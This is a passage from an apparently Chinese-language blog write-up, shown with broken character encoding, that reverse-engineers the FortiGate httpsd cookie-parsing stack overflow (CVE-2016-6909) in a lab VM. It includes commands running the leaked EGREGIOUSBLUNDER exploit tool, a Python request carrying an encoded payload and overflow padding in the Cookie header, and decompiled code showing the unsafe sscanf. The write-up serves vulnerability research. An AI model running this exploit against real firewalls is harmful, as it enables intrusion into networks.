/sbin/ftar -xf /migadmin.tar</span></span><br></pre></td></tr></table></figure>

<h3 id="II-bin-ç›®å½•æ–‡ä»¶åˆ†æ"><a href="#II-bin-ç›®å½•æ–‡ä»¶åˆ†æ" class="headerlink" title="II. bin ç›®å½•æ–‡ä»¶åˆ†æ"></a>II. bin ç›®å½•æ–‡ä»¶åˆ†æ</h3><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°çš„æ˜¯ï¼Œ<code>bin.tar.xz</code> è§£å‹å‡ºæ¥çš„æ–‡ä»¶åŸºæœ¬ä¸Šéƒ½æ˜¯æŒ‡å‘ <code>/bin/init</code> ä¸ <code>/bin/sysctl</code> çš„è½¯é“¾æ¥</p>
<p>å…¶ä¸­è¯¸å¦‚ <code>httpsd</code> ç­‰ç½‘ç»œæœåŠ¡éƒ½æ˜¯å‰è€…çš„è½¯é“¾æ¥ï¼Œå¯çŸ¥å‰è€…åº”å½“ä¸ºè¯¥é˜²ç«å¢™æä¾›çš„åŸºæœ¬çš„ç½‘ç»œæœåŠ¡</p>
<p>è€Œè¯¸å¦‚ <code>chmod</code> ç­‰å¸¸ç”¨å‘½ä»¤éƒ½æ˜¯åè€…çš„è½¯é“¾æ¥ï¼Œå¯çŸ¥åè€…åº”å½“ä¸ºç±»ä¼¼ busybox ä¸€æ ·çš„å·¥å…·åº“ï¼Œä¸è¿‡æ›´ä¸ºç²¾ç®€</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 31200</span><br><span class="line">drwxr-xr-x  2 root     root         4096 Aug 10 19:35 ./</span><br><span class="line">drwxr-xr-x 12 arttnba3 arttnba3     4096 Aug 10 19:37 ../</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 adsl_mon -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alarmd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alertmail -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 authd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 bgpd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardctl -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardmgr -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root           11 Aug 10 19:35 cat -&gt; /bin/sysctl</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cauploadd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassis5000d -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassisd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chat -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chlbd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root           11 Aug 10 19:35 chmod -&gt; /bin/sysctl</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="III-x2F-bin-x2F-init-é€†å‘åˆ†æ"><a href="#III-x2F-bin-x2F-init-é€†å‘åˆ†æ" class="headerlink" title="III. &#x2F;bin&#x2F;init é€†å‘åˆ†æ"></a>III. &#x2F;bin&#x2F;init é€†å‘åˆ†æ</h3><p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼š</p>
<p>é¦–å…ˆä¼šæ‰§è¡Œ <code>/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code> æ›¿æ¢è‡ªèº«ï¼Œè¯¥æ–‡ä»¶å…¶å®æ˜¯ <code>/bin/init</code> çš„è½¯é“¾æ¥ï¼Œæ•…è¿™é‡Œæœ¬è´¨ä¸Šåªæ˜¯æ›´æ”¹äº† pid ä¸ argv[0]</p>
<p>éšåä¼šå…³é—­ä¸‰ä¸ªæ ‡å‡†æ–‡ä»¶æè¿°ç¬¦å¹¶æ”¹å˜å½“å‰å·¥ä½œç›®å½•ä¸º <code>/</code>ï¼Œæ‰“å¼€ <code>/dev/null</code> å¹¶åˆ›å»ºä¸‰ä¸ªæŒ‡å‘å…¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆ0ã€1ã€2ï¼‰</p>
<blockquote>
<p>ç¬”è€…åç»­æ›¾ç»ä¸€åº¦è®¤ä¸ºåˆ©ç”¨å¤±è´¥å°±æ˜¯å› ä¸ºæ²¡æœ‰æ³¨æ„åˆ°è¾“å…¥è¾“å‡ºè¢«é‡å®šå‘è‡³ null è€Œæ— æ³•åœ¨å±å¹•ä¸Šæ‰“å°å‡ºä»»ä½•ä¿¡æ¯</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/11/vB5HUkGSR67P9yi.png" alt="image.png"></p>
<p>å¯åŠ¨åçš„ç•Œé¢å¦‚ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/08/11/pRVcK5Z1szT2uU3.png" alt="image.png"></p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>é¦–å…ˆä¸ºæˆ‘ä»¬çš„è™šæ‹Ÿæœºé…ç½®ä¸€ä¸ªæœ¬åœ° ip</p>
<p><img src="https://i.loli.net/2021/08/11/YzTN9P82sJiaBFc.png" alt="4M4_Z96@_NSPZR087A2_6QC.png"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜éœ€è¦è·å–åˆ°ä¸€ä¸ª cookie numï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -X HEAD -v http://192.168.116.100/login  2&gt;&amp;1 | grep <span class="string">&#x27;APSCOOKIE&#x27;</span></span></span><br><span class="line">&lt; Set-Cookie: APSCOOKIE_3943997904=0&amp;0; path=/; expires=Tue, 24-Aug-1971 18:40:48 GMT</span><br></pre></td></tr></table></figure>

<p>ä¹‹åä½¿ç”¨ <code>egregiousblunder</code> æµ‹è¯•è¯¥æ¼æ´ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./egregiousblunder_3.0.0.1 -t 192.168.116.100 -p 80 -l 4444 --ssl 0 --nope --gen 4nc --config EGBL.config --cookienum 3943997904 --stack 0xbffff114</span></span><br><span class="line">loading nopen over HTTP</span><br><span class="line">using stack addr 0xbffff114</span><br><span class="line">built authhash len 116</span><br><span class="line">built enc_authhash with len 116</span><br><span class="line">problem recv&#x27;ing ack1/hello, stack address probably wrong.  WAM might work?</span><br><span class="line">problem with sending file</span><br><span class="line">failure loading nopen over HTTP</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶åœ¨ fortigate çš„ CLI ä¸­æˆ‘ä»¬ä¾¿å¯ä»¥çœ‹åˆ° httpsd æœåŠ¡çš„å´©æºƒä¿¡æ¯åŠæ ˆå›æº¯</p>
<p><img src="https://i.loli.net/2021/08/11/fOPSQBG2elVkKja.png" alt="image.png"></p>
<p>ä½†æ˜¯è¿™é‡Œæ²¡èƒ½å¤ŸæˆåŠŸè·å¾—ä¸€ä¸ª shellï¼Œåˆæ­¥çŒœæµ‹æ˜¯ EGREGIOUSBLUNDER çš„ç‰ˆæœ¬é—®é¢˜</p>
<p>ä½¿ç”¨ wireshark æˆªå– EGREGIOUSBLUNDER æ‰€å‘é€çš„æ•°æ®åŒ…è¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° <code>0xbffff114</code> è¿™ä¸ªåœ°å€è¢«å¸ƒç½®åˆ°äº†httpè¯·æ±‚å¤´çš„ Cookie ä¸­çš„ <code>AuthHash</code> å­—æ®µï¼Œåˆæ­¥æ¨æµ‹è¿™åº”å½“æ˜¯ä½œä¸ºä¸€ä¸ªè¿”å›åœ°å€è¢«å¸ƒç½®ä¸Šå»çš„ï¼Œè¯´æ˜å¯èƒ½æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œè¿™ä¹Ÿä¸ CVE é€šå‘Šæ‰€è¯´çš„ã€cookie è§£æè¿‡ç¨‹ä¸­å‘ç”Ÿç¼“å†²åŒºæº¢å‡ºã€‘ç›¸å»åˆ</p>
<p><img src="https://i.loli.net/2021/08/12/nKClEmcT15JAQot.png" alt="image.png"></p>
<p>ä½¿ç”¨ postman ç®€å•ä»¿é€ è¯¥ http è¯·æ±‚å¦‚ä¸‹ï¼Œä½¿ç”¨å­—ç¬¦ <code>A</code> ç®€å•å¡«å…… AuthHash å­—æ®µï¼š</p>
<p><img src="https://i.loli.net/2021/08/12/XetkB3iWlKNaqjg.png" alt="image.png"></p>
<p>å½“æˆ‘ä»¬çš„å­—ç¬¦ A æ•°é‡è¾¾åˆ° 0x60 æ—¶å†ä¸€æ¬¡å‘ç”Ÿäº† crashï¼Œä¸è¿‡è¿™ä¸€æ¬¡çš„æ ˆå›æº¯æ›´ä¸ºè¯¦ç»†</p>
<p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" alt="image.png"></p>
<p>ä¸ºäº†æ–¹ä¾¿æ„é€  payload è¿›è¡Œåˆ©ç”¨ï¼Œæ¥ä¸‹æ¥ç¬”è€…é€‰æ‹©ä½¿ç”¨ python å‘é€ http è¯·æ±‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">url = <span class="string">&#x27;http://192.168.116.100/index&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>:<span class="string">&#x27;12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>:<span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>:<span class="string">&#x27;gzip,deflate,br&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;PostmanRuntime/7.28.3&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.116.100&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;APSCOOKIE_3943997904=Era=0&amp;Payload=Ã«YÃ¿Ã¡Ã¨Ã¸Ã¿Ã¿Ã¿PQRSTUVWQYjwGX4wHRPQPKj7Kj0Uj04n4vPa4K0D9OkD9Sm0D1AAKuGZt7rSSmZERAhlTFSNGzZXMbmktNW2nVOgG6Q7pzQcU2tcfN4Vxyxe9Gd9fbWWiR9imxw4DGv4Dz8BGf8lvKEyWb23teYizcaqrtSkyQulgX9UNIqkFFjg3HLkDsXMa92OhMt2mv1jnVn35Bo/CCcE+OA0j0V7vrRCnd0j2nzJkBavgWsg0qXdZOsEwU+mTEZvNi/6hC++Grg1ELLQgIF+uOLt3/60eJSpW3Nifa9b0lqzqTdZvJ+O3Fazgx8Wy+VeLj3EOW5n16UDHO0hecRR6CDEKMrZfKPrAW5EYTN3+711oO/Gf7gtT+S8lHyb1BucRUy+78on3PBNkJyCYz5YoP1z09BbvM8EPqz2NH8Fppto6+R6RL1RIlZRknQ2aojz5N3+7c2oc5ie9QPbiuHTZn+B3fUZnsiq2im8E/iJ1Dbe2kdQRXQDi6LJDAAO1zCWOBWIu9Z055WlAH83TiG7vD+NpLuu+OISQa0AHWdOJCRUNsbyU0ePqk9jrAGvGyT+B3fUZdGG0Q9PXB+xPdLDE/hJcDjrNZ5Dj5TfXbJlEhYzCbnOT87Xb3q1INbJSly+TUHj3NALlZovd+SPweRnEK+xf8qQpF7TkR5LwzHeNBJqBrhG5qBTUe1InfJSlp+ZsyrOc5ie9QPo1Z9+t4T+S8lHyf7wUVzzL/wAtzGNAKDMmvhSb+Mxi1Aa6RDjU3BzT+7i5hR77ns3DjCqsqThjVwSEqF5a2as3W7CqkTfXbMlEQ0yXjZrD5czPJNUFgEtp8A0p1soM1MUNWPiEHj5+iYl/ktF3u003rzEt+2wfLbQFLRihfLpV2F0Vti2/UaQA36quN6qL29Z+zKV+n/httOxXBySrPBYhJycx/Hd6DwY+RSHHukUjZMLZcTHvUTEIHw52Jal8myVcRaF0i/EXj7SNojyG20ffinV+/httpFTgtDBYPBYhJyccNzdfu0q8YxVFrV+bin/hV+ttpsdPBYhJyc++yWYL4p1NriVUVG/V8+DzDrTH2aTEcJq8Xw+1+rp44%0a&amp;AuthHash=&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">r = post(url, headers = headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(r.headers)</span><br></pre></td></tr></table></figure>

<h2 id="å®šä½æº¢å‡ºç‚¹"><a href="#å®šä½æº¢å‡ºç‚¹" class="headerlink" title="å®šä½æº¢å‡ºç‚¹"></a>å®šä½æº¢å‡ºç‚¹</h2><blockquote>
<p>ç”±äºä¸€äº›ç‰¹æ®ŠåŸå› ï¼Œç¬”è€…æœ¬åœ°æ— æ³•ç›´æ¥å¯åŠ¨å…¶ init ç¨‹åº</p>
<p>ç¬”è€…æœ¬æƒ³å°† gdb ç­‰æ‰“åŒ…è¿›å…¶æ–‡ä»¶ç³»ç»Ÿä¸­ç›´æ¥åœ¨è™šæ‹Ÿæœºå†…è¿›è¡Œè°ƒè¯•ï¼Œå¥ˆä½•æ–‡ä»¶ç³»ç»Ÿå®åœ¨å¤ªè€ï¼Œé‡æ‰“åŒ…åæ²¡æœ‰ä¸€æ¬¡å¯åŠ¨æˆåŠŸçš„ï¼Œåªå¥½ä½œç½¢â€¦</p>
</blockquote>
<p>æˆ‘ä»¬é¦–å…ˆæ ¹æ®è¿™ä¸ªæŠ¥é”™ä¿¡æ¯è¿›è¡Œæ ˆå›æº¯ï¼š</p>
<p><img src="https://i.loli.net/2021/08/12/ZHqku5i3BED8QlR.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:08C38A77                 call    sub_8C389B7</span><br><span class="line">.text:08C38A7C                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:08C38A7F                 leave</span><br><span class="line">.text:08C38A80                 retn</span><br><span class="line">.text:08C38A80 sub_8C38A61     endp</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ° <code>sub_8C389B7()</code> å‡½æ•°ï¼Œæˆ‘ä»¬å‘ç°å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>sub_8C38440()</code> å‡½æ•°ï¼Œç®€å•åˆ†ææˆ‘ä»¬ä¸éš¾çŸ¥é“è¯¥è°ƒç”¨é“¾ä»…ä»…æ˜¯ç”¨äºæ‰“å°æŠ¥é”™ä¿¡æ¯</p>
<p><img src="https://i.loli.net/2021/08/12/NYucT3GlibfU8dW.png" alt="image.png"></p>
<p>ç»§ç»­åˆ†æå…¶è°ƒç”¨é“¾ï¼Œlibc offset 0x1d218 å¤„ä»£ç å¦‚ä¸‹ï¼Œè¯¥æ®µä»£ç ä½äº libc ä¸­å‡½æ•° <code>__libc_sigaction()</code>ï¼Œç”¨ä»¥è¿›è¡Œ <code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0001D210 loc_1D210:                              ; DATA XREF: __libc_sigaction+CAâ†“o</span><br><span class="line">.text:0001D210                 mov     eax, 0ADh</span><br><span class="line">.text:0001D215                 int     80h             ; LINUX - sys_rt_sigreturn</span><br><span class="line">.text:0001D217                 nop</span><br><span class="line">.text:0001D218 loc_1D218:                              ; DATA XREF: __libc_sigaction+D9â†“o</span><br><span class="line">.text:0001D218                 pop     eax</span><br><span class="line">.text:0001D219                 mov     eax, 77h ; &#x27;w&#x27;</span><br><span class="line">.text:0001D21E                 int     80h             ; LINUX - sys_sigreturn</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­å›æº¯ï¼Œ<code>0x8204F8D</code> çš„ä¸Šä¸€æ¡æŒ‡ä»¤è°ƒç”¨äº† <code>sub_820483B()</code> å‡½æ•°ï¼Œé€šè¿‡é€†å‘æˆ‘ä»¬å‘ç°è¯¥å‡½æ•°ä¼šè°ƒç”¨ <code>sub_820429D()</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_820429D</span><span class="params">(<span class="type">int</span> *a1, _BYTE *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> **v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> *v11[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v10 = sub_83297EE(*a1, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 || (a2 = (_BYTE *)sub_8329B12(a1[<span class="number">34</span>], <span class="string">&quot;Cookie&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11[<span class="number">0</span>] = (<span class="type">char</span> *)sub_8344CBA(*a1, &amp;a2, <span class="number">59</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v11[<span class="number">0</span>] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">while</span> ( ((*__ctype_b_loc())[(<span class="type">unsigned</span> __int8)*a2] &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )</span><br><span class="line">        ++a2;</span><br><span class="line">      v2 = (<span class="type">const</span> <span class="type">char</span> *)sub_8344CBA(*a1, v11, <span class="number">61</span>);</span><br><span class="line">      v3 = (<span class="type">const</span> <span class="type">char</span> *)sub_8204B9C(a1);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v2, v3) )</span><br><span class="line">        sub_820CB5E(v11[<span class="number">0</span>]);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>sub_8329B12()</code> å‡½æ•°è°ƒç”¨äº† <code>strcasecmp()</code>ï¼Œå¤§è‡´åˆ†æåº”å½“æ˜¯åˆ¤æ–­å­—ç¬¦ä¸²å­˜åœ¨æ€§çš„å‡½æ•°ï¼Œåœ¨è¿™é‡Œä¼ å…¥çš„å‚æ•°ä¸­åŒ…å«å­—ç¬¦ä¸² <code>&quot;Cookie&quot;</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¤§è‡´å¯ä»¥æ¨æµ‹è¯¥å‡½æ•°åº”å½“æ˜¯ httpsd ï¼ˆå³æœ¬è¿›ç¨‹ï¼‰ä¸­è¢«ç”¨ä»¥å¤„ç† Cookie ç›¸å…³çš„å‡½æ•°ä¹‹ä¸€</p>
<p>å±€éƒ¨å˜é‡ v3 çš„æ±‚è§£æ¶‰åŠåˆ°å‡½æ•° <code>sub_8204B9C()</code>ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8204B9C</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( nCfg_debug_zone )</span><br><span class="line">    v1 = nCfg_debug_zone + <span class="number">45972</span>;</span><br><span class="line">  v2 = sub_8204B37(v1);</span><br><span class="line">  <span class="keyword">return</span> sub_8329797(*a1, (<span class="type">int</span>)<span class="string">&quot;%s_%lu&quot;</span>, <span class="string">&quot;APSCOOKIE&quot;</span>, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¸éš¾å‘ç°å…¶æœ€åè°ƒç”¨çš„ <code>sub_8329797()</code> ä¼ å‚å½¢å¼åº”å½“æ˜¯æŒ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œæœ€ç»ˆæ‹¼å‡‘å‡ºæ¥çš„å½¢å¼åº”å½“å¦‚ <code>APSCOOKIE_114514</code> ï¼ˆç¤ºä¾‹æ•°å­—ï¼‰çš„å½¢å¼ï¼Œè€Œä¸Šå±‚è°ƒç”¨ä¸­ä½¿ç”¨ <code>strstr()</code> åˆ¤æ–­ v3 åœ¨ v2 ä¸­æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¸ªå½¢å¼æˆ‘ä»¬ä¸æˆ‘ä»¬ä¼ å…¥çš„ Cookie çš„å†…å®¹å¼€å¤´ç›¸å»åˆï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºæ¥ä¸‹æ¥çš„ <code>sub_820CB5E()</code> å‡½æ•°åº”å½“æ¶‰åŠåˆ°å¯¹ Cookie çš„è§£æå·¥ä½œ</p>
<p>æ¥ä¸‹æ¥ç»§ç»­åˆ†æ <code>sub_820CB5E()</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_820CB5E</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">108</span>]; <span class="comment">// [esp+116Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  size = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    size = <span class="built_in">strlen</span>(a1) + <span class="number">1</span>;</span><br><span class="line">  src = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x52</span>u);</span><br><span class="line">  v16 = <span class="number">20</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  ptr = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_820C6F0();</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">sscanf</span>(a1, <span class="string">&quot;Era=%1d&amp;Payload=%[^&amp;]&amp;AuthHash=%s&quot;</span>, &amp;v17, v21, s) == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>åš pwn çš„åŒå­¦åº”è¯¥<strong>ç¬¬ä¸€çœ¼å°±èƒ½å¤Ÿçœ‹åˆ°ä¸€ä¸ªå¤§å¤§çš„ %s æ˜ å…¥ä½ çš„çœ¼å¸˜ï¼Œååˆ†æ˜æ˜¾çš„ä¸€ä¸ªæ ˆæº¢å‡º</strong>ï¼Œæˆ‘ä»¬çš„æ¼æ´ä¾¿ä½äºè¿™ä¸ªä½ç½®ï¼šå¯¹ Cookie å†…å®¹çš„è§£æä½¿ç”¨äº†ä¸å®‰å…¨çš„ <code>%s</code> è¯»å– AuthHash åˆ°æ ˆä¸Šä»è€Œä½¿å¾—å…¶å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</p>
<blockquote>
<p>è¿™ä¸ªå¹´ä»£è¿˜æœ‰é’ˆå¯¹ <code>%s</code> çš„æ¼æ´å±å®ä»¤äººæ³ªç›®</p>
</blockquote>
<h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>httpsd ä¸ºå¯¹ init çš„è½¯é“¾æ¥ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆå¯¹ init ç¨‹åºè¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./init</span></span><br><span class="line">[*] &#x27;/home/arttnba3/Desktop/cves/CVE-2016-6909/exploit/init&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    RPATH:    b&#x27;../lib:../ulib:/fortidev/lib:/lib&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>ä¿  æŠ¤  å…¨  å…³</strong>ï¼Œæˆ‘ä»¬æœ‰ç›¸å½“å¤§çš„æ“ä½œç©ºé—´</p>
